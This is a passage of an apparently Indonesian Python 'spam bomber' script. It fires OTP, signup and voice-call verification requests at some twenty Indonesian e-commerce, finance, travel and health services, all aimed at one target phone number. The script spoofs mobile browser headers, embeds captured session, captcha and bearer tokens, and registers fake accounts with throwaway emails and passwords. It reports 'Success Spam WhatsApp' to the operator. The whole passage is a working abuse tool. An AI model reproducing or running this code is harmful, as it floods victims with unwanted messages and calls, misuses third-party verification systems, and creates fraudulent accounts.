			#possing = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",headers={"Host":"www.matahari.com","content-length":"76","x-newrelic-id":"Vg4GVFVXDxAGVVlVBgcGVlY=","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","x-requested-with":"XMLHttpRequest","sec-ch-ua-platform":"Android","origin":"https://www.matahari.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.matahari.com/customer/account/create/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"otp_request":{"mobile_number":"0"+nomor,"mobile_country_code":"+62"}})).text
			segar=requests.post("https://api-v2.segari.id//v1/otps/generate",headers={"Host":"api-v2.segari.id","content-length":"30","accept":"application/json, text/plain, */*","x-segari-platform":"web","origin":"https://segari.id","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","referer":"https://segari.id/login","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":nomor})).text
			al=requests.get("https://www.toyskingdom.co.id/membership/send-otp?cellphone="+nomor+"&otp_type=register&email=tololbet615%40gmail.com",headers={'Host':'www.toyskingdom.co.id','Connection':'keep-alive','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','Accept':'*/*','X-Requested-With':'XMLHttpRequest','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','Sec-Fetch-Site':'same-origin','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://www.toyskingdom.co.id/membership/register/+aqXlp409RHHXTQyyGCurg==/zb3+iKnqYXQ86its61Z4Jg==','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}).text
			ses=requests.post("https://api.pintarnya.com/api/pk/auth/register/mobile",headers={'Host':'api.pintarnya.com','content-length':'27','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','sec-ch-ua-mobile':'?1','authorization':'Bearer undefined','user-agent':'Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','platform':'web-kerja','sec-ch-ua-platform':'"Android"','origin':'https://pintarnya.com','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://pintarnya.com/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"mobile":"+62"+nomor})).text
			cookiesdekoruma = {    '_gcl_au': '1.1.153712919.1682601391',    '_ga': 'GA1.1.742380246.1682601391',    '_cioanonid': '861c4f81-6d10-fa0f-34ab-1ed422bc6559',    '_tt_enable_cookie': '1',    '_ttp': 'qGrFB3lP03dFmyicRH3PDv4-rhf',    '_fbp': 'fb.1.1682601394372.1220706897',    'sessionid': '3bczai920o84o3ibd558v1qtzruos6xw',    '_uetsid': 'bc704380e4fd11eda6429b4c73d83ab6',    '_uetvid': 'bc712190e4fd11ed821537365eca1466',    'cto_bundle': '9y3FCF9UbE14JTJGMHBnRE56bGJrVDNCRjdWUmolMkJOb1dPZkluWTNMaHBTaUElMkZ5aWhvUWVMUlVUQVFMbiUyRnhkZGhLNjJua1k1STl5V3ZjaFNUbFZpc0ZSYiUyRktLNkNsd2ptRzhyYkZxdnB1Q0U0MzAlMkZjRnZOdDRaZ003WGpKcnJTJTJCMXI0V21jcXM3SGd0MFdPVnMlMkJ5M0U0NkxvRXJ3JTNEJTNE',    '_ga_WWE89F9P0R': 'GS1.1.1682601390.1.1.1682601406.44.0.0',    'amplitude_id_10086b139f80de87a84ac4fe88e37890dekoruma.com': 'eyJkZXZpY2VJZCI6IjFkMDIxM2M4LWMzMmUtNDNkMS05NzJiLWVlZTQ1ODBiNjViMVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTY4MjYwMTM5MTc1OCwibGFzdEV2ZW50VGltZSI6MTY4MjYwMTQyNjAwMywiZXZlbnRJZCI6NSwiaWRlbnRpZnlJZCI6Mywic2VxdWVuY2VOdW1iZXIiOjh9',}
			headersdekoruma = {    'authority': 'auth.dekoruma.com',    'accept': '*/*',    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',    'content-type': 'application/json',    'origin': 'https://m.dekoruma.com',    'referer': 'https://m.dekoruma.com/',    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',    'sec-ch-ua-mobile': '?1',    'sec-ch-ua-platform': '"Android"',    'sec-fetch-dest': 'empty',    'sec-fetch-mode': 'cors',    'sec-fetch-site': 'same-site',    'user-agent': 'Mozilla/5.0 (Linux; Android 12; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',}
			paramsdekoruma = {    'format': 'json',}
			json_data = {    'phoneNumber': '+628'+nomor,    'platform': 'wa',    'captchaInput': '',}
			response = requests.post('https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/',params=paramsdekoruma,headers=headersdekoruma,json=json_data).text
			#pos=requests.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",headers={'Host':'api.duniagames.co.id','content-length':'58','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','accept-language':'id','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','content-type':'application/json','ciam-type':'FR','accept':'application/json, text/plain, */*','x-device':'c44cbb7b-b080-4cd3-8526-a90c0b5d3a98','sec-ch-ua-platform':'"Android"','origin':'https://duniagames.co.id','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://duniagames.co.id/','accept-encoding':'gzip, deflate, br'},data=json.dumps({"phoneNumber":"+62"+nomor,"userName":"0"+nomor})).text
			headerskredito={
'Host':'app-api.kredito.id',
'Connection':'keep-alive',
'Content-Length':'80',
'sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
'Accept-Language':'id-ID',
'sec-ch-ua-mobile':'?1',
'User-Agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
'Content-Type':'application/json; charset=UTF-8',
'Accept':'application/json, text/javascript, */*; q=0.01',
'LPR-BRAND':'Kredito',
'LPR-PLATFORM':'h5',
'sec-ch-ua-platform':'"Android"',
'Origin':'https://mobile.kredito.id',
'Sec-Fetch-Site':'same-site',
'Sec-Fetch-Mode':'cors',
'Sec-Fetch-Dest':'empty',
'Referer':'https://mobile.kredito.id/',
'Accept-Encoding':'gzip, deflate, br'}
			datakredito=json.dumps({"mobilePhone":nomor,"event":"default_verification","sender":"jatissms"})
			postkredito=requests.post("https://app-api.kredito.id/client/v1/common/verify-code/send",headers=headerskredito,data=datakredito).text
			headersmobilku={
'Host':'api.mobilku.com',
'content-length':'42',
'sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
'accept':'application/json, text/plain, */*',
'content-type':'application/json',
'sec-ch-ua-mobile':'?1',
'authorization':'Bearer',
'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform':'"Android"',
'origin':'https://www.mobilku.com',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://www.mobilku.com/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			datamobilku=json.dumps({"name":"Shhsbdbd","mobile":nomor})
			postmobilku=requests.post("https://api.mobilku.com/user/register",headers=headersmobilku,data=datamobilku).text
			headmapclub={
'Host':'beryllium.mapclub.com',
'content-length':'25',
'sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
'client-platform':'WEB',
'client-timestamp':'1686537041150',
'accept-language':'en-US',
'sec-ch-ua-mobile':'?1',
'authorization':'Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiJjYWU4MzQ2Yy0wM2RkLTQ4MGMtOTNiOS1kODQxMGMwYjQ3ZDkiLCJleHBpcmVkIjoxNjg2NTQwNjM4NzY5LCJleHBpcmUiOjM2MDAsImV4cCI6MTY4NjU0MDYzOCwiaWF0IjoxNjg2NTM3MDM4LCJwbGF0Zm9ybSI6IldFQiJ9.YvBffH6hv-SXkqMIvS2az_aG4NI8LmDZN7rdfIe2J-tIYY44EOlXCf9Nij7s5lVxRpJajrk_ZlFcJWPNfIdKJg',
'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
'content-type':'application/json',
'accept':'application/json, text/plain, */*',
'sec-ch-ua-platform':'"Android"',
'origin':'https://www.mapclub.com',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://www.mapclub.com/',
'accept-encoding':'gzip, deflate, br'}
			datamapclub=json.dumps({"account":nomor})
			postmapclub=requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=WHATSAPP",headers=headmapclub,data=datamapclub).text
			#sms
			headqoala={
'Host':'api.qoala.app',
'content-length':'216',
'sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
'accept':'application/json, text/plain, */*',
'x-captcha-token':'03AL8dmw9Sb-QOxk4DHQJPtU_VDq4Q1Fz1w3iVZWcPk4-1W-WJpFLyeuDas8ufLH-0d5d4B-Rrs2QwMjCNJQQ75UaheJ9nyGR316PHipBmN3d9gT-sHh0RxsLEqFZyQsvxf5RdsRWe3RCDErgr7lWqex9wNXJKw1nA90SbSvwEJpyh0olTW8-r45dW23tIVCoTW2syFUt2zDA_DVA1LV7sIIp186Qz9ZxeVPV1i--qZi5ULSZvG52jMrRQZLGtBch-HH5RL7-rMBtUOqWr4AbEWNT5EC5y_IWO_uTi7ou4Sfp-ORDzbj_ueIetQ3kGt9mjlgVSPMLcz6yHgvDDuHJGqHfeJDW7NU_JAtLphP9TyBz_-wYNXKx7NF4UeT2BCKQYmI7xkDf0d1I-d83P8ddlij_iIA77rOKRJ45NUrR0Hz-fwn443iHZoiqwSUQ2Z7jmjGm9M7pI7WMQjKX3L4E5Balf-7QCrINEZHSvbjKTbn0LnkFXFa4tHivu_ZHD78KlxU98jwF1oxgEIDzb8pQDYOoQbOwBPrVuFtIXahXQtsuFIfdKKRxPMKLld1QqlmNXef6no5mF48dJCzzE-LVf6g_Jjd54eeSMZGie8meicKksRFFwkk3f_cx4LGjQ3Ixa1IGKERxDLhfQNG20EIkx0irRI_D15RtAHsVERfLrbDRwiUGGwfMvzC_BLBV_4nALj0WX2IuSqCkQ745rBleXKZGcs-lF3gmFfweKyx_ZNFs9LhmIS7rcwUSVl7dwJ-Ql_OrdJOnMinUT8_lgSRw6MWxBe7AV-XEUm-ayols13XhED3SQnqG80ZZU1XVH7wAgXVhdADz7ylwQs9aE3FFzothFkg9_egwnoNP1DsmjwmIzIEVeaIf0UbVVO96te105e1EbCyIVCwrSwC28_pizozFLN-1CnMrqi0P94ralcWnySm75mbKVzXC-nIpzv9h8uKT_LD_ys_hNGiPaDQ7XfYjBSNNlizWbohYGHYE49KSb86IolgvPWRNxw40yB285YPqemy5PmZ2evLPOFnPb99WoyylbIkq7dGw_EIuf3uJJ8ameXk-cfnBqHTpNFSJPGGTzXnIbEbLYoWzQ6RbSGvGEpeOiDlm824hfed4CrUySFi7ySkCgrMiEKYcmh8CF0RHNGD7_ogxMie3z1UkF9WI2SyW-L8B6nST33eEtLAXd95Frdld7zh6_YSnqpMpGTdUNcov0EZFr3hk2_rNsZBGTJBYz24uWxir7DBPzZQH_yqaHBOPwzkaCDWhU2YWuCISmulvSxNkpQ8BZgIbSUKCOTwBiFKUX_34xhUc-o5_xqxKNfXAHcBrRkLcHGaDzKk7Wus7INWqxFyZVIkNxAM8yla928OlYXm_p_f1lR_BwfXaTDoNgy9IVcNObe9ZsgkQSilVbcOCUIWKFcVNuMKbmiXrLC-ABC1w8_GMkO1i1j2rOFHE941fVCZ8Af2Idhut7YDEUk4et',
'content-type':'application/json;charset=UTF-8',
'sec-ch-ua-mobile':'?1',
'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform':'"Android"',
'origin':'https://www.qoala.app',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://www.qoala.app/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			dataqoala=json.dumps({"fullName":"Shsb Ssdbbd","email":"anjay2827@gmail.com","phoneNumber":"+62"+nomor,"identityType":"KTP","nationality":"ID","password":"@liF1234","passwordConfirmation":"@liF1234","lang":"id","privacyPolicy":"true"})
			postqoala=requests.post("https://api.qoala.app/api/registrations",headers=headqoala,data=dataqoala).text
			headeci={
'Host':'eci.id',
'Connection':'keep-alive',
'Content-Length':'205',
'sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
'Accept':'application/json, text/plain, */*',
'Content-Type':'application/json',
'sec-ch-ua-mobile':'?1',
'User-Agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform':'"Android"',
'Origin':'https://eci.id',
'Sec-Fetch-Site':'same-origin',
'Sec-Fetch-Mode':'cors',
'Sec-Fetch-Dest':'empty',
'Referer':'https://eci.id/verification?step=1&phone=0'+nomor,
'Accept-Encoding':'gzip, deflate, br',
'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			dataeci=json.dumps({"identity":"0"+nomor,"with":"sms","signatureData":"MTg1NjhmMWNkM2QxOWYyZTYzYTQxNTNhMGJhYzFhNDJkOTc0MmZmYTExMTkwNjI4ZjgxMDcxMjQ5MGY3OGJkMw==","nonceData":"9vt4v4sbiqi3391pmsyrpeovhdr90vsb:1686569200"})
			posteci=requests.post("https://eci.id/api/signup",headers=headeci,data=dataeci).text
			headfave={
'Host':'api.myfave.com',
'Connection':'keep-alive',
'Content-Length':'26',
'sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
'x-user-agent':'Fave-PWA/v1.0.0',
'content-type':'application/json',
'sec-ch-ua-mobile':'?1',
'User-Agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform':'"Android"',
'Accept':'*/*',
'Origin':'https://myfave.com',
'Sec-Fetch-Site':'same-site',
'Sec-Fetch-Mode':'cors',
'Sec-Fetch-Dest':'empty',
'Referer':'https://myfave.com/',
'Accept-Encoding':'gzip, deflate, br',
'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			datafave=json.dumps({"phone":"+62"+nomor})
			postfave=requests.post("https://api.myfave.com/api/fave/v5/auth/request_code",headers=headfave,data=datafave).text
			headpluang={
'Host':'api-pluang.pluang.com',
'sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
'sec-ch-ua-mobile':'?1',
'x-platform':'desktop-web',
'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
'content-type':'application/json',
'accept':'application/json, text/plain, */*',
'x-request-id':'ae4031fa-321a-4d23-bd0a-f1a38675b3e0',
'sec-ch-ua-platform':'"Android"',
'origin':'https://pluang.com',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://pluang.com/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			datapluang=json.dumps({"name":"Bsbsjsnsbbs","email":"anjay2827@gmail.com","phone":"+62"+nomor,"signature":"bb1bf7c0ee5ae148989f4587b3b41fe5c369b07678a65666c5035552e2e931e4","referral":""})
			postpluang=requests.post("https://api-pluang.pluang.com/api/v3/user/signup/phone",headers=headpluang,data=datapluang).text
			headaladin={
'Host':'m.misteraladin.com',
'content-length':'81',
'sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
'accept-language':'id',
'sec-ch-ua-mobile':'?1',
'x-platform':'mobile-web',
'content-type':'application/json',
'accept':'application/json, text/plain, */*',
'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform':'"Android"',
'origin':'https://m.misteraladin.com',
'sec-fetch-site':'same-origin',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://m.misteraladin.com/account',
'accept-encoding':'gzip, deflate, br'}
			dataaladin=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})
			postaladin=requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers=headaladin,data=dataaladin).text
			headtraveloka={
'Host':'api.amplitude.com',
'content-length':'1378',
'sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
'sec-ch-ua-platform':'"Android"',
'sec-ch-ua-mobile':'?1',
'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
'content-type':'application/x-www-form-urlencoded; charset=UTF-8',
'accept':'*/*',
'origin':'https://m.traveloka.com',
'sec-fetch-site':'cross-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://m.traveloka.com/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			datatraveloka=json.dumps({"checksum":"6432d7fb35df1314e9c271642d4d9a19","client":"1a5adb65aec08240fd195927f2dc7365","e":"%5B%7B%22device_id%22%3A%22pjCGLCg6vql8jQsnIiOp0f%22%2C%22user_id%22%3Anull%2C%22timestamp%22%3A1686540231732%2C%22event_id%22%3A6%2C%22session_id%22%3A1686540214551%2C%22event_type%22%3A%22app_InstallBannerView%22%2C%22version_name%22%3Anull%2C%22platform%22%3A%22Web%22%2C%22os_name%22%3A%22Chrome%20Mobile%22%2C%22os_version%22%3A%22114%22%2C%22device_model%22%3A%22Android%22%2C%22device_manufacturer%22%3Anull%2C%22language%22%3A%22id-ID%22%2C%22carrier%22%3Anull%2C%22api_properties%22%3A%7B%7D%2C%22event_properties%22%3A%7B%22bannerSource%22%3A%22headerBanner%22%2C%22pageUrl%22%3A%22https%3A%2F%2Fm.traveloka.com%2Fid-id%2Fuser%2Fverify%2Fsignup%2FPN%2F%2B62"+nomor+"%2Fnull%2Finput%22%2C%22platform%22%3A%22android%22%2C%22lang%22%3A%22id%22%2C%22country%22%3A%22ID%22%2C%22currency%22%3A%22IDR%22%7D%2C%22user_properties%22%3A%7B%7D%2C%22uuid%22%3A%2228474db9-c48a-4296-bb49-88bfec914a9b%22%2C%22library%22%3A%7B%22name%22%3A%22amplitude-js%22%2C%22version%22%3A%227.2.1%22%7D%2C%22sequence_number%22%3A7%2C%22groups%22%3A%7B%7D%2C%22group_properties%22%3A%7B%7D%2C%22user_agent%22%3A%22Mozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F114.0.0.0%20Mobile%20Safari%2F537.36%22%7D%5D","upload_time":"1686540231736&v=2"})
			postteaveloka=requests.post("https://api.amplitude.com/",headers=headtraveloka,data=datatraveloka).text
			headoyo={
'Host':'analytics.oyorooms.com',
'accept-language':'id',
'sec-ch-ua-mobile':'?1',
'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
'content-type':'application/json',
'externalheaders':'[object Object]',
'oyo_ab_config':'mww2:1|ioab:1|mhdp:1|bcrp:0|pwbs:1|hsdm:2|comp:0|nrmp:1|nhyw:1|ppsi:0|recs:1|swhp:0|lvhm:1|gmbr:0|yolo:1|rcta:1|cbot:1|otpv:1|ndbp:0|mapu:1|nclc:0|dwsl:1|eopt:1|otpv:1|wizi:0|morr:1|yopb:0|TTP:1|aimw:1|hdpn:1|web2:0|log2:0|spw1:0|log2:0|ugce:0|ltvr:0|hwiz:0|wizz:1|lpcp:1|clhp:0|prwt:1|cbhd:1|ins2:2|',
'fingerprint_hash':'099f81099e5c57e6acbedd90af1b832d',
'access_token':'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=',
'xsrf-token':'bXI4kcTV-fQMIwHOpKV7_VEG_dvYsdEcZ9cg',
'sec-ch-ua-platform':'"Android"',
'accept':'*/*',
'origin':'https://www.oyorooms.com',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://www.oyorooms.com/',
'accept-encoding':'gzip, deflate, br'}
			dataoyo=json.dumps({"data":[{"gaId":"UA-52365165-1","dType":"mobile website","uId":"Not logged in","serverTS":"1686527822745","platformMeta":"099f81099e5c57e6acbedd90af1b832d","ts":"1686527822749","type":"","target":"https://www.oyorooms.com/login","url":"https://www.oyorooms.com/api/pwa/generateByPhone?locale=id","event":"oauthGenerateCode","method":"POST","statusCode":"200","statusText":"","userAgent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","platform":"Linux armv81","lastJourneyPath":"Client Side Logging","fetchData":"{\"method\":\"POST\",\"credentials\":\"include\",\"body\":\"{\\\"phone\\\":\\\""+nomor+"\\\",\\\"country_code\\\":\\\"+62\\\",\\\"country_iso_code\\\":\\\"ID\\\",\\\"nod\\\":4,\\\"send_otp\\\":true,\\\"devise_role\\\":\\\"Consumer_Guest\\\"}\",\"headers\":{\"access_token\":\"SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=\",\"Accept-Language\":\"id\",\"Accept-encoding\":\"gzip\",\"Content-Type\":\"application/json\",\"consumer_host\":\"https://www.oyorooms.com\",\"sData\":\"eyJrdWQiOlszNDMwMCw1ODEwMCw0MjYwMCwyMjcwMCwzMzMwMCwyMTMwMCwyMDkwMCw0MjIwMCw0NjQwMCwzMDUwMCwyMzkwMF0sImFjYyI6W10sImd5ciI6W10sInR1ZCI6W10sInRpZCI6W10sImtpZCI6WzE0NDA3MDAwLDE2ODA0MDAsMTE2ODAwLDIyMzIwMCwyMjczMDAsMjE2ODAwLDE0NTcwMCwyNjMwMDAsMTU0MTAwLDExNDgwMCwxMjk4MDAuMDAwMDAwMDAwMDFdLCJ0bXYiOltdfQ==\",\"deviceid\":\"099f81099e5c57e6acbedd90af1b832d821425\",\"loc\":153,\"XSRF-TOKEN\":\"bXI4kcTV-fQMIwHOpKV7_VEG_dvYsdEcZ9cg\",\"externalHeaders\":{}}}"}],"classType":"EVENT_DATA"})
			postoyo=requests.post("https://analytics.oyorooms.com/analytics/sendData",headers=headoyo,data=dataoyo).text
			pizzahut=requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({  "email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})).text
			dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+nomor,"platform":"sms"})).text
			bli=requests.post("https://www.blibli.com/backend/common/users/_request-otp",headers={"Host":"www.blibli.com","content-length":"27","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.blibli.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.blibli.com/login?ref=&logonId=0"+nomor,"accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":"0"+nomor})).text
			postmapclub2=requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=SMS",headers=headmapclub,data=datamapclub).text
			#email
			headmajo={
'Host':'dashboard.majoo.id',
'content-length':'187',
'sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
'sec-ch-ua-platform':'"Android"',
'sec-ch-ua-mobile':'?1',
'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
'content-type':'application/json',
'accept':'*/*',
'origin':'https://dashboard.majoo.id',
'sec-fetch-site':'same-origin',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://dashboard.majoo.id/auth/register',
'accept-encoding':'gzip, deflate, br',
'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			datamajo=json.dumps({"ip":"10.130.23.86","email":email,"password":"@njay123","usahaName":"","phoneNumber":"","browser":"chrome 114.0.0 - Android OS","referalCode":"","is_agree":1,"method":1})
			#call
			xsrf = requests.get("https://magneto.api.halodoc.com/api/v1/users/status").cookies.get_dict()
			headhaldoc = {"referer": "https://www.halodoc.com","content-type": "application/json","x-xsrf-token": xsrf['XSRF-TOKEN']}
			paylodhaldoc = {"phone_number": "+62"+nomor,"channel": "voice"}
			cokihaldoc = {"cookie": '_gcl_au=1.1.935637007.1686465186; _gid=GA1.2.1888372629.1686465187; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7={"g":"9ade8176-03c1-dd87-f8d7-c0c3f60f861a","c":1686465187381,"l":1686465187381}; XSRF-TOKEN='+xsrf['XSRF-TOKEN']+'; afUserId=31b1ff72-9c27-4492-a787-7a895c0d422e-p; AF_SYNC=1686465191318; _ga_02NBJNEKVH=GS1.1.1686465187.1.1.1686465223.0.0.0; amp_394863=WECZG4ZhC4dZKUWVGE4Ogh...1h2kii76k.1h2kiiai8.3.0.3; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7={"g":"c13c57ed-4fbf-80d3-7b17-19eb5a8fcedc","e":1686467027367,"c":1686465187365,"l":1686465227367}; _ga=GA1.2.1084460534.1686465187'}
			response = requests.post("https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests",headers=headhaldoc,data=json.dumps(paylodhaldoc),cookies=cokihaldoc).json()
			print (f"  {putih}[{H}✓{putih}] Success Spam WhatsApp Ke {H}{nomor} {putih}({Y}{a}{putih})")
	except requests.exceptions.ConnectionError:
		sys.exit(f"{W}[{R}!{W}] Koneksi Eror Silakan Cek Jaringan Anda")
	except FileNotFoundError:
		sys.exit(f"{putih}[{R}!{putih}] Target Not Found {R}!")
	except KeyboardInterrupt:
